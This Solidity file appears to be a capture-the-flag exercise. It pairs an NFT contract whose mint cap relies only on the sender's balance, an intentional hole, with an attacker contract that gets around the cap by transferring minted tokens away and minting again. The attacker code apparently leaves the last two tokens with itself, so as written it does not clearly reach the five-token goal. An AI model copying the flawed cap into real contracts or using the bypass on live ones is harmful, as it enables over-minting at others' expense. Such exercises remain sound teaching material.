// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract Overmint2 is ERC721 {
    using Address for address;
    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") {}


    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}

contract Overmint2Attacker {
    Overmint2 public target;
    address public owner;

    constructor(address _target) {
        target = Overmint2(_target);
        owner = msg.sender;
    }

    function attack() external {
        
        target.mint();
        target.mint();
        target.mint();

        
        target.transferFrom(address(this), owner, 1);
        target.transferFrom(address(this), owner, 2);
        target.transferFrom(address(this), owner, 3);

       
        target.mint();
        target.mint();
    }
}